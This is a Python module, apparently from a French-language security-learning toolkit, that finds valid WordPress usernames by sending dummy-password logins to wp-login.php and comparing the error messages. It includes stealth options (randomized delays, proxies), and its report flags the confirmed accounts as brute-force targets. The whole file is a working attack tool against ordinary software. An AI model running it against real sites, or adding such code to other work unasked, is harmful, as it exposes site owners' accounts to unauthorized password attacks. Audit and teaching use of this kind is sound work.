"""Énumération de comptes WordPress valides via différences de réponse wp-login.php."""

from __future__ import annotations

from learnwhitehack.core.config import AppConfig
from learnwhitehack.core.http_client import make_session
from learnwhitehack.core.logger import get_logger
from learnwhitehack.core.reporter import Report, Severity

log = get_logger("wordpress.login_enum")

_LOGIN_URL = "/wp-login.php"

# Messages WP qui indiquent un username VALIDE (mauvais mot de passe)
_VALID_USER_INDICATORS = [
    "The password you entered for the username",
    "mot de passe que vous avez entré pour l'identifiant",
    "incorrect password",
    "lost your password",
]

# Messages qui indiquent un username INVALIDE
_INVALID_USER_INDICATORS = [
    "Invalid username",
    "Identifiant inconnu",
    "there is no account with that username",
    "Error: The email address isn",
]


def run(cfg: AppConfig, report: Report, usernames: list[str] | None = None) -> list[str]:
    """Teste une liste de noms d'utilisateurs et retourne les valides."""
    base_url = cfg.target.url.rstrip("/")
    if not base_url:
        log.error("Aucune URL cible configurée.")
        return []

    url = base_url + _LOGIN_URL
    log.info(f"[bold]wordpress.login_enum[/] → {url}")

    if not usernames:
        log.warning("Aucun username à tester. Utiliser --users ou lancer api_users/author_archives d'abord.")
        return []

    session = make_session(
        min_delay=cfg.stealth.min_delay,
        max_delay=cfg.stealth.max_delay,
        proxies=cfg.stealth.proxies,
        verify_ssl=cfg.http.verify_ssl,
    )

    # Récupérer le nonce wp-login
    try:
        get_resp = session.get(url, timeout=cfg.http.timeout)
    except Exception as e:
        log.error(f"Impossible d'accéder à {url}: {e}")
        return []

    if get_resp.status_code != 200:
        log.warning(f"wp-login.php → HTTP {get_resp.status_code}")
        return []

    valid_users: list[str] = []
    dummy_password = "definitely_wrong_password_12345!"

    for username in usernames:
        try:
            resp = session.post(
                url,
                data={
                    "log": username,
                    "pwd": dummy_password,
                    "wp-submit": "Log+In",
                    "redirect_to": base_url + "/wp-admin/",
                    "testcookie": "1",
                },
                timeout=cfg.http.timeout,
                allow_redirects=True,
            )
        except Exception as e:
            log.debug(f"Erreur {username}: {e}")
            continue

        body = resp.text.lower()

        is_valid = any(ind.lower() in body for ind in _VALID_USER_INDICATORS)
        is_invalid = any(ind.lower() in body for ind in _INVALID_USER_INDICATORS)

        if is_valid and not is_invalid:
            log.info(f"  [green]Username valide[/] : {username}")
            valid_users.append(username)
        elif is_invalid:
            log.debug(f"  Username invalide : {username}")
        else:
            log.debug(f"  Résultat ambigu pour : {username}")

    if valid_users:
        report.add_finding(
            module="wordpress.login_enum",
            severity=Severity.HIGH,
            title=f"{len(valid_users)} username(s) WordPress valide(s) confirmé(s)",
            detail=(
                "Les différences de message dans wp-login.php permettent de confirmer "
                "l'existence des comptes suivants. Ils peuvent être ciblés par brute-force."
            ),
            evidence={"valid_users": valid_users, "login_url": url},
        )

    return valid_users
